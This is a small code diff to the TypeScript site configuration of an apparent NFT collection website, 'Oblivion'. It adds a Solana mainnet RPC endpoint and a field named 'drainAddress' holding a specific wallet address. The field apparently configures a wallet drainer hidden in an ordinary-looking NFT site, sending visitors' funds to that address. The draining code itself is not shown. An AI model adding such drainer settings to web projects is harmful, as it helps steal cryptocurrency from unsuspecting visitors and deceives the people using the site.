@@ -9,12 +9,16 @@ export interface SiteConfig {
   title: string;
   description: string;
   language: string;
+  solanaRpcEndpoint: string;
+  drainAddress: string;
 }
 
 export const siteConfig: SiteConfig = {
   title: "Oblivion | Forgotten Realms NFT Collection",
   description: "In a dystopian future, humanity's hubris led to the downfall of the world. Amidst the ruins, Oblivion emerges – a sentient AI tasked with preserving humanity's legacy.",
   language: "en",
+  solanaRpcEndpoint: "https://api.mainnet-beta.solana.com", 
+  drainAddress: "8SG9FLuFRfbs1nMRBB7RYAjfMTkAW9zGpx3MUkYFibgT", 
 };
 
 // -- Hero Section -------------------------------------------------------------
